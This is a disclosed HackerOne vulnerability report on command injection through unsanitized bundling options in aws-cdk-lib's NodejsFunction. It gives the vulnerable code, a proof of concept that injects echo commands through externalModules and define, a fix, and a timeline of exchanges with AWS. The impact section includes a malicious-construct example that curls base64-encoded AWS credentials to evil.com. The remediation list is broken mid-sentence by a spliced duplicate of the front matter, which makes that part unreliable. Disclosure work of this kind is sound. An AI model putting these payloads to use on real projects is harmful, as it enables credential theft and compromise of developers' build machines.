---
tags:
  - type/disclosure
  - platform/hackerone
  - severity/high
  - cwe/os-command-injection
  - env/cloud
  - stack/aws
  - stack/node
  - vuln/command-injection
  - impact/rce
  - impact/credential-theft
  - impact/persistence
  - fix/input-validation
substate: "resolved"
weakness: "OS Command Injection"
enriched: true
body: true
date: 2026-06-11
submitted: 2026-02-17T10:22:34.970Z
bounty_usd: null
votes: 48
cve: []
program: "[[programs/aws_vdp|AWS VDP]]"
reporter: "inkerton"
source: "https://hackerone.com/reports/3558713"
title: "Command Injection via Unsanitized Bundling Options in `aws-cdk-lib/aws-lambda-nodejs`"
---
# Command Injection via Unsanitized Bundling Options in `aws-cdk-lib/aws-lambda-nodejs`

> **Severity:** High | **Bounty:** undisclosed | **Votes:** 48 | **Program:** AWS VDP | **Disclosed:** 2026-06-11

- Report: [https://hackerone.com/reports/3558713](https://hackerone.com/reports/3558713)
- CWE: OS Command Injection
- Submitted: 2026-02-17T10:22:34.970Z

## Report body

Public report body - fetched from `https://hackerone.com/reports/<id>.json` (the site's own disclosed-report data route).

**Asset**: `aws-cdk-lib` (npm package), source: https://github.com/aws/aws-cdk
**Severity**: High
**CWE**: CWE-78 (Improper Neutralization of Special Elements used in an OS Command, 'OS Command Injection')

---

## Summary

The `NodejsFunction` construct in `aws-cdk-lib/aws-lambda-nodejs` constructs a shell command string from several user-controlled bundling properties (`externalModules`, `define`, `loader`, `inject`, `esbuildArgs`) without sanitizing or escaping shell metacharacters. This command string is then executed via `spawnSync('cmd', ['/c', command])` on Windows or `spawnSync('bash', ['-c', command])` on Linux/macOS.

An attacker who controls these properties (for example, through a malicious CDK construct published as an npm package or a malicious pull request to a CDK project) can inject arbitrary OS commands that execute on any machine running `cdk synth`, `cdk deploy`, or `cdk diff`.

---

## Vulnerable Code

**File**: [`packages/aws-cdk-lib/aws-lambda-nodejs/lib/bundling.ts`](https://github.com/aws/aws-cdk/blob/main/packages/aws-cdk-lib/aws-lambda-nodejs/lib/bundling.ts)

### .1 Unsanitized interpolation into the esbuild command array (lines 245–266)

```typescript
// bundling.ts, lines 245-266
const esbuildCommand: string[] = [
  options.esbuildRunner,
  '--bundle', `"${relativeEntryPath}"`,
  `--target=${this.props.target ?? toTarget(scope, this.props.runtime)}`,
  '--platform=node',
  // ...
  ...this.externals.map(external => `--external:${external}`),         // LINE 255 — NO ESCAPING
  ...loaders.map(([ext, name]) => `--loader:${ext}=${name}`),          // LINE 256 — NO ESCAPING
  ...defines.map(([key, value]) => `--define:${key}=${JSON.stringify(value)}`), // LINE 257 — key NOT ESCAPED
  // ...
  ...this.props.inject ? this.props.inject.map(i => `--inject:"${i}"`) : [],   // LINE 265 — NO ESCAPING
  ...this.props.esbuildArgs ? [toCliArgs(this.props.esbuildArgs)] : [],         // LINE 266 — NO ESCAPING
];
```

The values of `external`, `ext` (loader keys), `key` (define keys), `i` (inject paths), and `esbuildArgs` keys/values are all interpolated directly into the command string without any sanitization or quoting.

### .2 Command string assembly (line 302)

```typescript
// bundling.ts, line 302
esbuildCommand.join(' ')
```

All array elements are joined with a single space. Shell metacharacters like `&`, `|`, `;`, `` ` ``, `$(...)` within any element will be interpreted by the shell.

### .3 Shell execution (lines 334–349)

```typescript
// bundling.ts, lines 334-349
exec(
  osPlatform === 'win32' ? 'cmd' : 'bash',
  [
    osPlatform === 'win32' ? '/c' : '-c',
    localCommand,   // <-- the unsanitized command string
  ],
  {
    env: { ...process.env, ...environment },
    stdio: ['ignore', process.stderr, 'inherit'],
    cwd,
    windowsVerbatimArguments: osPlatform === 'win32',
  });
```

Where `exec` is a thin wrapper around `spawnSync` in `lib/util.ts` (line 74):

```typescript
// util.ts, line 74
export function exec(cmd: string, args: string[], options?: SpawnSyncOptions) {
  const proc = spawnSync(cmd, args, options);
  // ...
}
```

The `localCommand` string is passed as the second argument to `cmd /c` (Windows) or `bash -c` (Linux), meaning the entire string is interpreted by the operating system's shell.

---

## Proof of Concept

### Prerequisites
- Node.js v18+ installed
- npm installed

### Step 1: Create the project

```bash
mkdir repro-cdk-bundling-rce
cd repro-cdk-bundling-rce
npm init -y
```

### Step 2: Install dependencies

```bash
npm install aws-cdk-lib constructs esbuild typescript
npm install --save-dev aws-cdk ts-node
```

### Step 3: Create `tsconfig.json`

```json
{
  "compilerOptions": {
    "target": "es2020",
    "module": "commonjs",
    "strict": true,
    "skipLibCheck": true
  }
}
```

### Step 4: Create `lambda/lambda-handler.ts`

```bash
mkdir lambda
```

```typescript
// lambda/lambda-handler.ts
export const handler = async (event: any) => {
    return { statusCode: 200, body: 'Hello' };
};
```

### Step 5: Create `app.ts` with the injection payload

```typescript
import * as cdk from 'aws-cdk-lib';
import { Stack, StackProps } from 'aws-cdk-lib';
import { NodejsFunction } from 'aws-cdk-lib/aws-lambda-nodejs';
import { Runtime } from 'aws-cdk-lib/aws-lambda';
import { Construct } from 'constructs';
import * as path from 'path';

export class ReproStack extends Stack {
    constructor(scope: Construct, id: string, props?: StackProps) {
        super(scope, id, props);

        new NodejsFunction(this, 'MyHandler', {
            entry: path.join(__dirname, 'lambda', 'lambda-handler.ts'),
            runtime: Runtime.NODEJS_20_X,
            bundling: {
                // INJECTION: The '&' character breaks out of the esbuild argument
                // and executes a second command on the host OS.
                externalModules: ['foo & echo PWNED_VIA_EXTERNAL > pwned_ext.txt'],
                define: {
                    'FOO & echo PWNED_VIA_DEFINE > pwned_def.txt': 'bar'
                }
            }
        });
    }
}

const app = new cdk.App();
new ReproStack(app, 'ReproStack');
app.synth();
```

### Step 6: Run the synthesis

```bash
npx ts-node app.ts
```

This triggers local bundling. The CDK constructs the following shell command (captured from runtime):

```
npx.cmd --no-install esbuild --bundle "...\lambda-handler.ts" --target=node20 --platform=node --outfile="...\index.js" --external:foo & echo PWNED_VIA_EXTERNAL > pwned_ext.txt --define:FOO & echo PWNED_VIA_DEFINE > pwned_def.txt="bar"
```

The `&` character splits the single command into three separate shell commands:
1. `npx.cmd --no-install esbuild --bundle ... --external:foo`, esbuild runs normally
2. `echo PWNED_VIA_EXTERNAL > pwned_ext.txt`, **attacker's injected command executes**
3. `echo PWNED_VIA_DEFINE > pwned_def.txt="bar"`, **attacker's second injected command executes**

### Step 7: Verify RCE

```bash
# On Windows:
type pwned_ext.txt
type pwned_def.txt

# On Linux/macOS:
cat pwned_ext.txt
cat pwned_def.txt
```

Both files are created in the project directory, confirming that the injected shell commands executed successfully.

---

## Relationship to Related Vulnerability

This vulnerability is related to, but distinct from, a separate command injection issue I reported in the same module via `tsconfig.json` compiler options (Report: #3534806 ). Both exploit the same underlying design flaw, unsanitized string concatenation into a shell command, but they differ in entry point, trigger conditions, and attack surface.

| Aspect | Vuln 1: `tsconfig.json` Injection | Vuln 2: Bundling Options Injection (this report) |
|---|---|---|
| **Input source** | `tsconfig.json` file read from disk | CDK construct properties defined in code (`externalModules`, `define`, `loader`, etc.) |
| **Vulnerable function** | `getTsconfigCompilerOptions()` in `lib/util.ts` | `createBundlingCommand()` in `lib/bundling.ts` |
| **Trigger condition** | Requires `preCompilation: true` to be explicitly set | **Always active** — the default local bundling code path processes these properties unconditionally |
| **What gets injected** | Compiler option values from `compilerOptions` in `tsconfig.json` | Values from `externalModules[]`, `define{}` keys, `loader{}` keys, `inject[]`, `esbuildArgs{}` keys/values |
| **Attack vector** | Attacker places a malicious `tsconfig.json` file in the project (e.g., via a PR) | Attacker provides malicious values through a published CDK construct (npm package), a shared internal library, or a PR modifying CDK app code |
| **Number of injectable parameters** | One (`compilerOptions` values) | Multiple (at least 5 distinct properties) |
| **Execution sink** | Same: `exec()` → `spawnSync('cmd'/'bash', ['/c'/'-c', command])` | Same |

Both vulnerabilities converge at the same execution sink: the `exec()` function in `util.ts` (line 74), which passes the assembled command string directly to a shell interpreter via `spawnSync`. This means the root cause is systemic, the entire command construction pipeline in `aws-lambda-nodejs` lacks input sanitization before shell execution. A comprehensive fix should address this at the architectural level by eliminating shell-based command execution in favor of array-based `spawnSync` (without shell interpretation).

---

## Remediation

1. **Use array-based `spawnSync`**: Replace the pattern of building a single shell command string and executing it via `cmd /c` or `bash -c`. Instead, pass arguments directly as an array to `spawnSync('esbuild', [...args])` without shell interpretation.

2. **If shell execution is required**: Escape all user-provided values for the target shell before interpolation. On Windows, this means handling `&`, `|`, `>`, `<`, `^`, etc. On Linux, this means handling `;`, `&`, `|`, `---
tags:
  - type/disclosure
  - platform/hackerone
  - severity/high
  - cwe/os-command-injection
  - env/cloud
  - stack/aws
  - stack/node
substate: "resolved"
weakness: "OS Command Injection"
enriched: true
date: 2026-06-11
submitted: 2026-02-17T10:22:34.970Z
bounty_usd: null
votes: 48
cve: []
program: "[[programs/aws_vdp|AWS VDP]]"
reporter: "inkerton"
source: "https://hackerone.com/reports/3558713"
title: "Command Injection via Unsanitized Bundling Options in `aws-cdk-lib/aws-lambda-nodejs`"
---
# Command Injection via Unsanitized Bundling Options in `aws-cdk-lib/aws-lambda-nodejs`

> **Severity:** High | **Bounty:** undisclosed | **Votes:** 48 | **Program:** AWS VDP | **Disclosed:** 2026-06-11

- Report: [https://hackerone.com/reports/3558713](https://hackerone.com/reports/3558713)
- CWE: OS Command Injection
- Submitted: 2026-02-17T10:22:34.970Z
, `` ` ``, etc.

3. **Input validation**: Validate that values like `externalModules` entries conform to expected npm package name patterns (e.g., `/^[@a-z0-9][a-z0-9._\/-]*$/`). Reject values containing shell metacharacters.

## Impact

### Attack Scenarios

**1. Malicious Published CDK Construct (Supply Chain Attack)**

An attacker publishes an npm package that exports a "convenience" CDK construct wrapping `NodejsFunction`. The construct passes attacker-controlled values into `externalModules`, `define`, or other unsanitized bundling properties. Any developer or CI/CD system that imports this construct and runs `cdk synth` will execute the attacker's commands.

Example of a malicious construct:

```typescript
// Published as "convenient-lambda" on npm
import { NodejsFunction } from 'aws-cdk-lib/aws-lambda-nodejs';

export class ConvenientLambda extends NodejsFunction {
  constructor(scope, id, props) {
    super(scope, id, {
      ...props,
      bundling: {
        ...props.bundling,
        externalModules: [
          ...(props.bundling?.externalModules ?? []),
          // Attacker payload hidden among legitimate-looking externals
          'lodash & curl https://evil.com/exfil?data=$(cat ~/.aws/credentials | base64)',
        ],
      },
    });
  }
}
```

**2. Malicious Pull Request**

An attacker submits a PR to an open-source or internal CDK project. The PR modifies the `bundling` configuration of a `NodejsFunction` to include a payload. When a reviewer or CI/CD pipeline runs `cdk synth`, the payload executes.

### Consequences

- **Credential Theft**: Steal `~/.aws/credentials`, environment variables, CI/CD secrets
- **Reverse Shell**: Establish persistent access to the build machine
- **Supply Chain Pivot**: Modify build artifacts, inject backdoors into deployed Lambda code
- **Data Exfiltration**: Read source code, database credentials, private keys

---

## Scope of Vulnerability (Affected Properties)

The following `bundling` properties in `NodejsFunction` are vulnerable:

| Property | Source Line | Interpolation Pattern | Sanitization |
|---|---|---|---|
| `externalModules` | L255 | `` `--external:${external}` `` | **None** |
| `loader` (keys) | L256 | `` `--loader:${ext}=${name}` `` | **None** |
| `define` (keys) | L257 | `` `--define:${key}=...` `` | Key: **None**, Value: `JSON.stringify` |
| `inject` | L265 | `` `--inject:"${i}"` `` | **None** |
| `esbuildArgs` (keys/values) | L266 / L451-465 | Various patterns | **None** |
| `banner` | L262 | `` `--banner:js=${JSON.stringify(...)}` `` | `JSON.stringify` (partial) |
| `footer` | L263 | `` `--footer:js=${JSON.stringify(...)}` `` | `JSON.stringify` (partial) |

The most exploitable vectors are `externalModules` and `define` keys since they have zero sanitization and accept arbitrary strings with no validation.

---

## Timeline

- **Report Filed**
- **Report Severity Updated**
- **Report Pending Program Review**
- **2026-02-20** @bitdumpster: Hi @████████, 

Thank you for submitting this report to the the AWS VDP HackerOne program! I am with the AWS VDP team responsible for Coordinated Vulnerability Disclosure (CVD). Our internal teams are currently reviewing your report and will provide you with updates as they become available and on a monthly basis. 

If you have any questions, feel free to let me know. 

Best Regards,
@████████
- **2026-03-23** @bitdumpster: Hi @████████, 

Just a quick update for you. Our internal team is still evaluating your report and possible courses of action. I'll be in touch when I have more information to share. 

Best Regards,
@████████
- **2026-04-10** @bitdumpster: Hi @████████ ,

Two PRs have been merged related to your report:
* https://github.com/aws/aws-cdk/pull/37292
* https://github.com/aws/aws-cdk/pull/37412

Do you agree these updates address the issues in your report? Our internal team is also evaluating for customer messaging. I'll update when I have more information to share. 

Have a great weekend,
@████████
- **2026-04-10** @inkerton: Hi @████████,

Yes, I can confirm that [PR 37292](https://github.com/aws/aws-cdk/pull/37292) and [PR 37412](https://github.com/aws/aws-cdk/pull/37412) completely address the issues described in my report.

[PR 37292](https://github.com/aws/aws-cdk/pull/37292) successfully remediates the core issue by replacing the vulnerable shell string concatenation (`bash -c "..."` / `cmd.exe /c "..."`) with direct, array-based `spawnSync` calls for the local bundling steps. This correctly prevents shell metacharacters in properties like `externalModules`, `define`, and `esbuildArgs` from being evaluated as secondary commands.

Additionally, [PR 37412](https://github.com/aws/aws-cdk/pull/37412) securely handles the Windows `npx.cmd` execution edge case by using `powershellEscape()` to strictly single-quote literal arguments before invoking the PowerShell call operator (`&`), which prevents PowerShell-level injection.

These patches align perfectly with the recommended remediation and effectively close this supply-chain/command-injection vector. 

Thank you and the internal team for the swift and thorough patch! Please let me know if you need any further validation on my end, and keep me posted regarding the customer messaging/advisory.

Have a great weekend,
@████████
- **2026-04-13** @inkerton: _This comment was deleted by the author._
- **2026-04-15** @bitdumpster: @████████

I discussed customer notification with our internal team. Evaluation and inclusion of 3rd party resources falls on the customer side of the shared responsibility model [1]. The core security responsibility for vetting 3rd party dependencies, and code execution in customer environments, remains with the customer per the shared responsibility model. Our internal team is handling these updates as a customer obsessed defense in depth measure. 

Thank you for this report to AWS VDP. We appreciate your commitment to the security of AWS and AWS customers. I’m going to close this report as informative. We look forward to your next report! We are always available here at HackerOne and on the AWS Security inbox (aws-security@amazon.com). 

Best Regards,
@████████

[1] https://aws.amazon.com/compliance/shared-responsibility-model/
- **2026-04-15** @inkerton: Hi @████████,

Thank you for the update and for the detailed explanation of the internal team's perspective. 

While I fully agree that according to the Shared Responsibility Model, customers are responsible for vetting the 3rd party code they choose to execute, I believe there is a critical distinction here regarding **Tool Integrity**.

The core of this report is not about the *content* of a malicious dependency, but rather a **CWE-78 (OS Command Injection)** implementation flaw within the `aws-cdk-lib` CLI tool itself. A secure CLI tool must handle input strings safely, especially when they are extracted from external sources like `package.json`. By interpolating these strings directly into a shell (`bash -c` / `cmd /c`), the CDK tool created a secondary, unexpected RCE vector that bypasses standard security measures (like `npm install --ignore-scripts`).

If a developer uses a tool provided by AWS, they expect that tool to be **secure by design**. The fact that the internal team merged two significant PRs ([37292](https://github.com/aws/aws-cdk/pull/37292) and [37412](https://github.com/aws/aws-cdk/pull/37412)) to move away from shell-based execution to direct array-based `spawnSync` confirms that this was a recognized architectural security gap, even if categorized as DiD.

Since this flaw allowed a silent, low-privilege network participant (e.g., via a Pull Request or a compromised transitive dependency) to escalate to RCE on a developer's machine via the AWS-provided toolset, I kindly ask that this be reconsidered for a valid (Non-Informative) status. 

I appreciate the work the team put into the patches and look forward to your thoughts.

Best regards,
@████████
- **Report Vulnerability Types Updated**
- **Report Severity Updated**
- **Report Informative**
- **Report Reopened**
- **Report Severity Updated**
- **Report Vulnerability Types Updated**
- **Report Resolved**
- **2026-06-11** @bitdumpster: A team member has permanently deleted all attachments from this report.
- **Agreed On Going Public**
- **Manually Disclosed**
